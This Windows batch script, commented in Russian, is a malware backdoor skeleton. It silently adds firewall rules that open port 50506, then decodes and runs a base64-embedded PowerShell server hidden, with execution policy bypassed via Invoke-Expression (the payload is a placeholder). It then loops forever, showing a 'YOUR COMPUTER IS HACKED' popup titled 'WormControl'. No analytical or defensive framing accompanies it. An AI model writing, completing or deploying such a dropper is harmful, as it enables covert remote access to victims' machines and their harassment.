@echo off
setlocal enabledelayedexpansion

:: === 1. открыть порт в файрволе (тихо) ===
netsh advfirewall firewall add rule name="WC-IN" dir=in action=allow protocol=TCP localport=50506 >nul 2>&1
netsh advfirewall firewall add rule name="WC-OUT" dir=out action=allow protocol=TCP localport=50506 >nul 2>&1
netsh advfirewall firewall add rule name="WC-IN-UDP" dir=in action=allow protocol=UDP localport=50506 >nul 2>&1

:: === 2. вшитый PowerShell-сервер (base64) ===
:: генерируется из server.ps1, лежит в переменной
set "PS_B64=<ВСТАВЬ_BASE64_СЮДА>"

:: декодируем и запускаем скрыто
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
"$b=[Convert]::FromBase64String('%PS_B64%'); $s=[Text.Encoding]::UTF8.GetString($b); Invoke-Expression $s"

:: === 3. цикл сообщения каждые 60 сек (параллельно) ===
:loop
timeout /t 60 /nobreak >nul
powershell -WindowStyle Hidden -NoProfile -Command ^
"Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('ТВОЙ КОМПЬЮТЕР ВЗЛОМАН','WormControl')" >nul 2>&1
goto loop
